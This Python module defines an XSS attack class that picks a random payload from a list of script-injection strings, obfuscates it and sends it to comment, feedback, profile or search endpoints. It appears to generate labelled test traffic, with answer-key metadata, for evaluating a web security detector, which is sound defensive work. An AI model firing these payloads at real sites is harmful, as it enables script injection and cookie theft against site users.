import random
from typing import Dict, Tuple
from .base import BaseAttack
from ..utils.obfuscator import Obfuscator

class XSSAttack(BaseAttack):
    PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(document.cookie)</script>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>"
    ]

    ENDPOINTS = [
        "/comment",
        "/feedback",
        "/profile",
        "/search"
    ]

    def generate(self, base_url: str) -> Tuple[Dict, Dict]:
        """
        Generates an XSS attack configuration.
        Returns: (request_kwargs, answer_key_metadata)
        """
        payload = Obfuscator.obfuscate(random.choice(self.PAYLOADS), self.obfuscation_level)
        endpoint = random.choice(self.ENDPOINTS)
        url = f"{base_url}{endpoint}"
        
        # XSS is often in POST bodies or GET parameters
        method = random.choice(["GET", "POST"])
        
        request_kwargs = {
            "method": method,
            "url": url,
        }
        
        if method == "POST":
            request_kwargs["data"] = {"comment": payload}
        else:
            request_kwargs["params"] = {"q": payload}

        metadata = {
            "type": "XSS",
            "endpoint": endpoint,
            "payload": payload,
            "method": method
        }
        
        return request_kwargs, metadata
